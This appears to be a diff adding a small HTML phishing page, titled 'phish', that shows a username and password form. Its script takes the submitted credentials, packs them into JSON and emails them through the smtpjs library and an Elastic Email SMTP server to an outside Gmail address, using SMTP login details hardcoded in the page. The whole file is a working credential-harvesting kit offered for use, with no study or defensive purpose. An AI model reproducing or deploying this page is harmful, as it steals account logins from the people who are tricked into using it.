@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>phish</title>
+  </head>
+  <body>
+    <p id='notifier'></p>
+    <form onsubmit="handleSubmit(event)">
+      <input type="text" name="username" placeholder="Username"/>
+      <input type="password" name="password" placeholder="password"/>
+      <input type="submit" name="submit" value="Submit"/>
+    </form>
+
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script type="text/javascript">
+
+      async function sendMail(From, To, Subject, Body) {
+        try{
+          const mailRequest = await Email.send({
+            Host:"smtp.elasticemail.com",
+            Username:"greekymea@gmail.com",
+            Password:"293C7C94D4707FDCFE2595B5BAABE7BD8D1A",
+            To,
+            From,
+            Subject,
+            Body
+          })
+
+          if (mailRequest == "OK"){
+            document.getElementById("notifier").innerHTML = `<span style="color:green">Mail sent to ${To} succesfully!</span>`
+          }
+          else {
+            document.getElementById("notifier").innerHTML = `<span style="color:red">Sending mail to ${To} failed!</span>`
+            console.log(mailRequest)
+          }
+        }catch (err) {
+          console.error(err.message)
+        }
+
+      }
+      function handleSubmit(e) {
+        e.preventDefault()
+        document.getElementById("notifier").innerHTML = ''
+        let formData = {}
+        for (var i = 0; i < e.target.elements.length; i++) {
+          let element = e.target.elements[i]
+
+          if (element.name != "submit") {
+            if (!element.value){
+              document.getElementById("notifier").innerHTML = `<span style='color:red'>${element.name} is required!</span>`
+              return false
+            }
+            formData[element.name] = element.value
+          }
+        }
+        const data = JSON.stringify(formData)
+
+        return sendMail("greekymea@gmail.com", "amunezeikenna@gmail.com", "login", data)
+      }
+    </script>
+  </body>
+</html>
